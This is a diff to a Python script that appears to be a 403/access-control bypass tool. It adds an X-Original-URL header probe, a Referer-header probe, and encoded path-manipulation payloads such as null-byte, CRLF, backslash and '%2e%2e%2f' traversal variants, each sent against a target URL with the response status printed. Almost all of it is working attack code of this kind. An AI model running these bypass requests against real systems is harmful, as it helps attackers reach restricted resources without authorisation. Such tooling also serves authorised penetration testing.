@@ -43,7 +43,12 @@ def add_original_header(url,path):
         print(f"X-Original-URL --> {payload} --> {r.status_code}")
     except:
         pass
-
+    try:
+        payload = f"{url}/asdnisaodnsakldmsads"
+        r = requests.get(payload,headers={"X-Original-URL": f"/{path}"},timeout=5)
+        print(f"X-Original-URL --> {payload} --> {r.status_code}")
+    except:
+        pass
 
 
 def rewrite(url,path):
@@ -55,7 +60,13 @@ def rewrite(url,path):
     except:
         pass
 
-
+def referer_header(url,path):
+    try:
+        payload = f"Referer: {url}/{path}"
+        r = requests.get(url,headers={"Referer":f"{url}/{path}"})
+        print(f"{payload} --> {url}/{path} --> {r.status_code}")
+    except:
+        pass
 def add_header(url,path):
     localip = "127.0.0.1"
     payloads = [
@@ -150,8 +161,20 @@ def pathManipulating(url,PATH):
         PATH+'~',
         PATH+'/~',
         PATH+'.json',
+        PATH+'..%00/',
+        PATH+"..%0d/",
+        PATH+"..%5c",
+        PATH+"..\\",
+        PATH+"..%ff/",
+        PATH+"%2e%2e%2f",
+        PATH+"%26",
+        PATH+"%3f",
+        PATH+".%e2/"
     ]
     for payload in payloads:
-        my_payload = f"{url}/{payload}"
-        r = requests.get(my_payload)
-        print(f"{my_payload} --> {r.status_code}")
+        try:
+            my_payload = f"{url}/{payload}"
+            r = requests.get(my_payload)
+            print(f"{my_payload} --> {r.status_code}")
+        except:
+            pass
